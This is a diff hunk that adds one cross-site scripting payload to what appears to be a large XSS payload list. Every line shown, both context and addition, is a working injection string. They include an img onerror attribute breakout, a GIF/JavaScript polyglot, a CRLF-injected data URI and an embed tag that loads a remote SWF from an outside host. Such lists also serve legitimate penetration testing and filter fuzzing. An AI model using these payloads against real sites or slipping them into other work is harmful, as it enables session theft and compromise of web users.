@@ -1672,3 +1672,4 @@ GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
 <embed/:script allowscriptaccess=always src=//l0.cm/xss.swf>
 <img/onerror=alert(1)+/src/<xss>
 %0d%0adata:text/html;text,<svg/onload=prompt(1)>
+"><img/src=">"onerror=confirm(123)>
